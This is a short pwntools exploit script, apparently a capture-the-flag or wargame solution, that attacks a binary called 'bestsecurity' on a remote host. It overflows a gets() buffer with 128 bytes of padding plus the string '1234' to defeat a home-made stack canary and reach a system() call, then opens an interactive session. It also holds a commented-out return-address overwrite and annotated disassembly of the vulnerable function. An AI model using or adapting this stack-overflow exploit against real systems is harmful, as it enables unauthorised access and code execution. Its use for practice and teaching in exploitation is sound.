from pwn import *

p = remote('plsdonthaq.me', 2003)
#p = process('./bestsecurity')
p.recvline()

padding = b'A'*128
comparison_string = b'1234'
payload = padding + comparison_string
#payload = b'A'*0x89 + p32(0x080491ee)

p.sendline(payload)
p.interactive()

'''
ltrace revealed 1234 comparison

080491b6 <check_canary>:

 80491bf:       8d 45 fb                lea    eax,[ebp-0x5]
 80491c2:       c7 00 13 23 33 43       mov    DWORD PTR [eax],0x43332313
 80491c8:       8d 85 7b ff ff ff       lea    eax,[ebp-0x85]
 80491ce:       50                      push   eax
 80491cf:       e8 7c fe ff ff          call   8049050 <gets@plt>
 80491d4:       83 c4 04                add    esp,0x4
 80491d7:       6a 04                   push   0x4
 80491d9:       68 0c a0 04 08          push   0x804a00c
 80491de:       8d 45 fb                lea    eax,[ebp-0x5]
 80491e1:       50                      push   eax
 80491e2:       e8 a9 fe ff ff          call   8049090 <strncmp@plt>
 80491e7:       83 c4 0c                add    esp,0xc
 80491ea:       85 c0                   test   eax,eax
 80491ec:       75 1c                   jne    804920a <check_canary+0x54>
 80491ee:       68 11 a0 04 08          push   0x804a011
 80491f3:       e8 68 fe ff ff          call   8049060 <puts@plt>
 80491f8:       83 c4 04                add    esp,0x4
 80491fb:       68 2f a0 04 08          push   0x804a02f
 8049200:       e8 6b fe ff ff          call   8049070 <system@plt>

'''